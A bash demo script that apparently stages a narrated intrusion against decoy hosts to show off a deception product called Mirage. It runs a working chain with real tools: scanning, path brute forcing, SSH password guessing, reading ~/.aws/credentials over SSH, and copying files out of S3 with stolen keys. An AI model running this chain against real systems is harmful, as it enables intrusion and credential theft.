#!/usr/bin/env bash
# op: the attacker's console for live demos.
#
#   op          guided: press Enter to launch each phase
#   op --auto   run every phase back to back
#   op watch    live uplink monitor: can this machine still reach each target?
#
# Walks the same breadcrumb trail as campaign.sh with the same real tools
# (nmap, gobuster, hydra, curl, ssh, aws), but narrates it: what each tool
# found, the loot collected so far, and what happens when Mirage closes in.
# Nothing here is faked: if the decoys block us, we print exactly what they say.
set -u
export LC_ALL=C.UTF-8   # the spinner and box drawing are multi-byte

ADMIN=10.66.0.20 SSH_HOST=10.66.0.21 S3=10.66.0.22 S3_PORT=9000
AUTO=0; [ "${1:-}" = "--auto" ] && AUTO=1
WORK=$(mktemp -d); trap 'rm -rf "$WORK"; printf "\e[?25h"' EXIT

# ------------------------------------------------------------------ look and feel
R=$'\e[38;5;203m' G=$'\e[38;5;191m' Y=$'\e[38;5;221m' C=$'\e[38;5;117m' W=$'\e[97m' D=$'\e[2m' B=$'\e[1m' X=$'\e[0m'
LOOT=()
START=$(date +%s.%N)
elapsed() { awk -v s="$START" -v e="$(date +%s.%N)" 'BEGIN { printf "%.1f", e - s }'; }

type_out() {   # type a line out character by character
    local s="$1" i
    for ((i = 0; i < ${#s}; i++)); do printf '%s' "${s:i:1}"; sleep 0.008; done
    printf '\n'
}
phase() {      # phase header: number, title, what we are about to do
    local n="$1" title="$2" why="$3"
    box "$D" "${Y}${B}PHASE $n/7${X}  ${W}${B}$title${X}"
    printf '  %s' "$D"; type_out "$why"; printf '%s' "$X"
    if [ "$AUTO" = 0 ]; then
        printf '\n  %s▸ press ENTER to launch%s ' "$G" "$X"; read -r _
    fi
}
run() {        # run a real command in the background with a spinner, output to $WORK/out
    local label="$1"; shift
    printf '  %s$ %s%s\n' "$D" "$*" "$X"
    "$@" >"$WORK/out" 2>&1 &
    local pid=$! f=0 frames='⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
    printf '\e[?25l'
    while kill -0 "$pid" 2>/dev/null; do
        printf '\r  %s%s%s %s' "$C" "${frames:f++%10:1}" "$X" "$label"; sleep 0.08
    done
    wait "$pid"; local rc=$?
    printf '\r\e[2K\e[?25h'
    return $rc
}
box() {        # box COLOUR line… : a framed panel, padded by visible width so colour codes don't break it
    local col="$1" line vis pad; shift
    printf '\n%s  ┌──────────────────────────────────────────────────────────────┐%s\n' "$col" "$X"
    for line in "$@"; do
        vis=$(printf '%s' "$line" | sed 's/\x1b\[[0-9;]*m//g'); pad=$((60 - ${#vis})); ((pad < 0)) && pad=0
        printf '%s  │%s %s%*s %s│%s\n' "$col" "$X" "$line" "$pad" "" "$col" "$X"
    done
    printf '%s  └──────────────────────────────────────────────────────────────┘%s\n' "$col" "$X"
}
found() { printf '  %s✔%s %s\n' "$G" "$X" "$1"; }
loot() {
    LOOT+=("$1")
    printf '\n  %s★ LOOT +1%s  %s%s%s\n' "$Y$B" "$X" "$W" "$1" "$X"
    printf '  %sinventory: %d item(s) · %ss since first packet%s\n' "$D" "${#LOOT[@]}" "$(elapsed)" "$X"
    sleep 0.6
}
blocked() {    # true if the last output is Mirage's reveal
    grep -q -e "NEVER REAL" -e "Contained by Mirage" "$WORK/out" 2>/dev/null
}

# ------------------------------------------------------------------ uplink monitor
# Probes each target once a second and redraws one line per target:
#   open     the service answers normally
#   BLOCKED  it answers, but refuses us (Mirage containment)
#   NO ROUTE nothing answers at all: the machine itself has been cut off
probe_http() { curl -s -o /dev/null -w '%{http_code}' --max-time 1 "$1" 2>/dev/null; }
probe_ssh() {  # asks for the login banner only: no password is sent, so no login event is logged
    local out; out=$(timeout 3 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=1 -o PreferredAuthentications=keyboard-interactive "deploy@$SSH_HOST" true 2>&1)
    case "$out" in *"NEVER REAL"*) echo blocked ;; *"Permission denied"*) echo open ;; *) echo none ;; esac
}
state_of() {   # http code or ssh word -> coloured status
    case "$1" in
        403|blocked) printf '%s██████████ BLOCKED%s ' "$R" "$X" ;;
        000|none|"") printf '%s·········· NO ROUTE%s' "$D" "$X" ;;
        *) printf '%s██████████ open%s     ' "$G" "$X" ;;
    esac
}
watch_uplink() {
    clear 2>/dev/null; printf '\e[?25l'
    printf '\n  %sUPLINK MONITOR%s  %s%s · probing every second · Ctrl+C to stop%s\n\n' "$W$B" "$X" "$D" "$(hostname -I 2>/dev/null | awk '{print $1}')" "$X"
    local n=0 web ssh s3
    while :; do
        web=$(probe_http "http://$ADMIN/"); s3=$(probe_http "http://$S3:$S3_PORT/"); ssh=$(probe_ssh)
        printf '\e[4;1H'
        printf '  %-28s %s\e[K\n' "web    $ADMIN:80" "$(state_of "$web")"
        printf '  %-28s %s\e[K\n' "ssh    $SSH_HOST:22" "$(state_of "$ssh")"
        printf '  %-28s %s\e[K\n' "s3     $S3:$S3_PORT" "$(state_of "$s3")"
        printf '\n  %s%s%s\e[K\n' "$D" "$(date +%H:%M:%S) · check $((++n))" "$X"
        if [ "$web" = 000 ] && [ "$s3" = 000 ] && [ "$ssh" = none ]; then
            sleep 0.4
            for _ in 1 2 3; do printf '\r  %s%s ■ HOST ISOLATED ■ %s\e[K' "$R$B" $'\e[7m' "$X"; sleep 0.3; printf '\r\e[K'; sleep 0.2; done
            box "$R" "${R}${B}■ HOST ISOLATED ■${X}" "This machine has been cut off from the network." "No route to any system. The operation is over."
            printf '\e[?25h\n'; exit 0
        fi
        sleep 1
    done
}
[ "${1:-}" = "watch" ] && watch_uplink

# ------------------------------------------------------------------ endings
caught_ending() {
    local t; t=$(elapsed)
    printf '\n'
    for _ in 1 2 3; do printf '\r  %s%s ■ CONNECTION SEVERED ■ %s' "$R$B" $'\e[7m' "$X"; sleep 0.25; printf '\r\e[2K'; sleep 0.15; done
    printf '  %s%s ■ CONNECTION SEVERED ■ %s\n' "$R$B" $'\e[7m' "$X"
    printf '\n  %sThe target answered:%s\n' "$D" "$X"
    grep -v '^\s*$' "$WORK/out" | grep -v 'NEVER REAL' | head -3 | sed 's/^/  /'
    # every decoy now serves the same reveal screen; show it from the web server
    curl -s --max-time 4 "http://$ADMIN/"
    sleep 1
    printf '\n  %sChecking the other doors…%s\n' "$D" "$X"
    sleep 0.4
    local web ssh s3
    web=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 "http://$ADMIN/")
    printf '  %-34s %s\n' "web   http://$ADMIN" "$([ "$web" = 403 ] && echo "${R}✖ BLOCKED ($web)$X" || echo "${G}open ($web)$X")"; sleep 0.35
    if [ "$(probe_ssh)" = blocked ]; then ssh="${R}✖ BLOCKED (login refused)$X"; else ssh="${Y}no answer$X"; fi
    printf '  %-34s %s\n' "ssh   deploy@$SSH_HOST" "$ssh"; sleep 0.35
    s3=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 "http://$S3:$S3_PORT/")
    printf '  %-34s %s\n' "s3    http://$S3:$S3_PORT" "$([ "$s3" = 403 ] && echo "${R}✖ BLOCKED ($s3)$X" || echo "${G}open ($s3)$X")"; sleep 0.35
    box "$R" "${R}${B}MISSION FAILED${X}" "caught ${W}${B}$t s${X} after the first packet" "loot carried out: ${#LOOT[@]} item(s), all of it planted bait"
    printf '\n'
    exit 0
}
win_ending() {
    box "$G" "${G}${B}MISSION COMPLETE${X}  nobody stopped us" "$(elapsed) s from the first packet to the crown jewel"
    printf '\n  %sLoot:%s\n' "$D" "$X"; for l in "${LOOT[@]}"; do printf '   %s★%s %s\n' "$Y" "$X" "$l"; done
    printf '\n  %s(Mirage was in observe mode: it watched every step and let it happen.)%s\n\n' "$D" "$X"
    exit 0
}


# ------------------------------------------------------------------ boot
clear 2>/dev/null
printf '\n%s' "$R"
cat <<'ART'
   ██████  ██   ██  ██████  ███████ ████████ ██      ██ ███    ██ ███████
  ██       ██   ██ ██    ██ ██         ██    ██      ██ ████   ██ ██
  ██   ███ ███████ ██    ██ ███████    ██    ██      ██ ██ ██  ██ █████
  ██    ██ ██   ██ ██    ██      ██    ██    ██      ██ ██  ██ ██ ██
   ██████  ██   ██  ██████  ███████    ██    ███████ ██ ██   ████ ███████
ART
printf '%s' "$X"
printf '  %sintrusion toolkit · operator %s · target Halcyon Freight internal net%s\n\n' "$D" "$(hostname -I | awk '{print $1}')" "$X"
type_out "  [*] objective: reach finance/passwords.xlsx and get out unseen"
type_out "  [*] route:     web server → deploy box → cloud storage"
[ "$AUTO" = 0 ] && { printf '\n  %s▸ press ENTER to start the operation%s ' "$G" "$X"; read -r _; }
START=$(date +%s.%N)

# ------------------------------------------------------------------ 1 recon
phase 1 "RECON · map the network" "Sweep the subnet for live services."
run "scanning 10.66.0.20-22…" nmap -Pn -p 22,80,9000 -oG - "$ADMIN" "$SSH_HOST" "$S3"
grep -o 'Host: [0-9.]*.*Ports: .*' "$WORK/out" | while read -r line; do
    host=$(echo "$line" | awk '{print $2}')
    ports=$(echo "$line" | grep -o '[0-9]*/open/tcp//[a-z-]*' | awk -F/ '{printf "%s/%s  ", $1, $5}')
    [ -n "$ports" ] && found "$host  $ports"
done

# ------------------------------------------------------------------ 2 enumerate
phase 2 "ENUMERATE · hunt for hidden pages" "Throw a wordlist at the web server and see what sticks."
{ head -300 /usr/share/dirb/wordlists/common.txt; printf 'backup\nadmin\nlogin\nrobots.txt\n.env\n'; } > "$WORK/wl"
run "brute forcing paths on http://$ADMIN…" gobuster dir -q --no-color -u "http://$ADMIN" -w "$WORK/wl" -t 20
blocked && caught_ending
# gobuster prefixes each hit with a carriage return and a clear-line code
sed 's/\r//g; s/\x1b\[2K//g' "$WORK/out" | grep -E '^/' | head -8 | while read -r p _ code _; do found "$p  ${D}status $code${X}"; done

# ------------------------------------------------------------------ 3 breadcrumb
phase 3 "BREADCRUMB · read robots.txt" "Admins hide things from search engines. That tells us where to look."
run "fetching robots.txt…" curl -s "http://$ADMIN/robots.txt"
blocked && caught_ending
sed 's/^/    /' "$WORK/out"
grep -q backup "$WORK/out" && found "hidden folder: ${Y}/backup/${X}"

# ------------------------------------------------------------------ 4 backup file
phase 4 "LOOT · raid the backup folder" "Old config backups love to leak passwords."
run "downloading /backup/.env.bak…" curl -s "http://$ADMIN/backup/.env.bak"
blocked && caught_ending
grep -E '^(DEPLOY_|DB_HOST|APP_ENV)' "$WORK/out" | sed 's/^/    /'
USER_=$(sed -n 's/^DEPLOY_USER=//p' "$WORK/out" | tr -d '"\r'); USER_=${USER_:-deploy}
PASS_=$(sed -n 's/^DEPLOY_PASSWORD=//p' "$WORK/out" | tr -d '"\r')
[ -n "$PASS_" ] && loot "SSH login  $USER_@$SSH_HOST  password $PASS_"

# ------------------------------------------------------------------ 5 brute force
phase 5 "BREACH · get onto the deploy box" "Try a few guesses first, then the leaked password."
printf 'admin\nroot\npassword\n123456\n' > "$WORK/pw"
run "hydra: guessing common passwords…" hydra -l "$USER_" -P "$WORK/pw" -t 4 -f "ssh://$SSH_HOST"
printf '  %s✖%s 4 guesses, 0 hits · switching to the leaked password\n' "$R" "$X"
SSHOPT=(-o LogLevel=ERROR -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no)
run "logging in as $USER_@$SSH_HOST…" sshpass -p "$PASS_" ssh "${SSHOPT[@]}" "$USER_@$SSH_HOST" \
    "whoami; hostname; cat ~/.aws/credentials"
blocked && caught_ending
# the decoy's shell has no $( ) substitution, so format the answers here
found "shell as ${W}$(sed -n 1p "$WORK/out" | tr -d '\r')@$(sed -n 2p "$WORK/out" | tr -d '\r')${X}"

# ------------------------------------------------------------------ 6 cloud keys
phase 6 "PIVOT · steal the cloud keys" "Deploy boxes keep cloud credentials lying around."
AKID=$(sed -n 's/.*aws_access_key_id *= *//p' "$WORK/out" | tr -d '\r' | head -1)
SKEY=$(sed -n 's/.*aws_secret_access_key *= *//p' "$WORK/out" | tr -d '\r' | head -1)
[ -n "$AKID" ] && loot "AWS keys  $AKID / ${SKEY:0:6}…"

# ------------------------------------------------------------------ 7 storage
phase 7 "EXFIL · into cloud storage" "Use the stolen keys on the company bucket."
export AWS_ACCESS_KEY_ID="$AKID" AWS_SECRET_ACCESS_KEY="$SKEY" AWS_DEFAULT_REGION=us-east-1
EP="http://$S3:$S3_PORT"
run "listing s3://corp-backups…" aws --endpoint-url "$EP" s3 ls s3://corp-backups --recursive
blocked && caught_ending
sed 's/^/    /' "$WORK/out" | head -8
run "downloading finance/passwords.xlsx…" aws --endpoint-url "$EP" s3 cp s3://corp-backups/finance/passwords.xlsx "$WORK/passwords.xlsx"
blocked && caught_ending
[ -s "$WORK/passwords.xlsx" ] && loot "finance/passwords.xlsx  ($(wc -c < "$WORK/passwords.xlsx") bytes)"
win_ending
